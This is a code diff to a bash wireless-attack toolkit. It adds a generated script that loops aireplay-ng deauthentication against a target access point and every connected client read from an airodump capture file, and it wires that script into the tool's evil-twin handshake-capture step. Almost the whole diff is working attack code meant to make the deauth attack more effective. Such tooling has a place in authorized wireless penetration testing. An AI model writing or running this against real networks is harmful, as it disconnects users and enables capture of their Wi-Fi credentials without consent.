@@ -14841,6 +14841,37 @@ function dos_attacks_menu() {
 }
 
 #Capture Handshake on Evil Twin attack
+#Build a targeted deauth loop script: deauths every client associated to the target
+#(read live from the airodump CSV) plus a broadcast fallback, refreshing as new
+#clients appear. Far more effective than a single broadcast deauth. Args at runtime:
+#$1 bssid  $2 deauth interface  $3 airodump csv path  $4 channel
+function set_et_targeted_deauth_script() {
+
+	debug_print
+
+	rm -rf "${tmpdir}et_targeted_deauth.sh" > /dev/null 2>&1
+	cat > "${tmpdir}et_targeted_deauth.sh" <<-'TARGETEDDEAUTH'
+	#!/usr/bin/env bash
+	target_bssid="${1}"
+	deauth_iface="${2}"
+	capture_csv="${3}"
+	target_channel="${4}"
+	trap 'kill 0' EXIT
+	iw dev "${deauth_iface}" set channel "${target_channel}" > /dev/null 2>&1
+	while true; do
+		aireplay-ng --deauth 5 -a "${target_bssid}" --ignore-negative-one "${deauth_iface}" > /dev/null 2>&1
+		if [ -f "${capture_csv}" ]; then
+			clients=$(awk -F',' 'BEGIN{IGNORECASE=1} /Station MAC/{s=1;next} s&&NF>=6{gsub(/ /,"",$1);gsub(/ /,"",$6); if($6==b && $1!="")print $1}' b="${target_bssid}" "${capture_csv}" | sort -u)
+			for c in ${clients}; do
+				aireplay-ng --deauth 5 -a "${target_bssid}" -c "${c}" --ignore-negative-one "${deauth_iface}" > /dev/null 2>&1
+			done
+		fi
+		sleep 3
+	done
+	TARGETEDDEAUTH
+	chmod +x "${tmpdir}et_targeted_deauth.sh" > /dev/null 2>&1
+}
+
 function capture_handshake_evil_twin() {
 
 	debug_print
@@ -14876,10 +14907,11 @@ function capture_handshake_evil_twin() {
 		;;
 		"Aireplay")
 			iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
+			set_et_targeted_deauth_script
 			recalculate_windows_sizes
-			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${hs_deauth_iface}" "aireplay deauth attack"
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"aireplay deauth attack\"" "bash ${tmpdir}et_targeted_deauth.sh ${bssid} ${hs_deauth_iface} ${tmpdir}handshake-01.csv ${channel}" "aireplay deauth attack"
 			if [ "${AIRSNIFFER_WINDOWS_HANDLING}" = "tmux" ]; then
-				get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${hs_deauth_iface}"
+				get_tmux_process_id "bash ${tmpdir}et_targeted_deauth.sh ${bssid} ${hs_deauth_iface} ${tmpdir}handshake-01.csv ${channel}"
 				processidattack="${global_process_pid}"
 				global_process_pid=""
 			fi
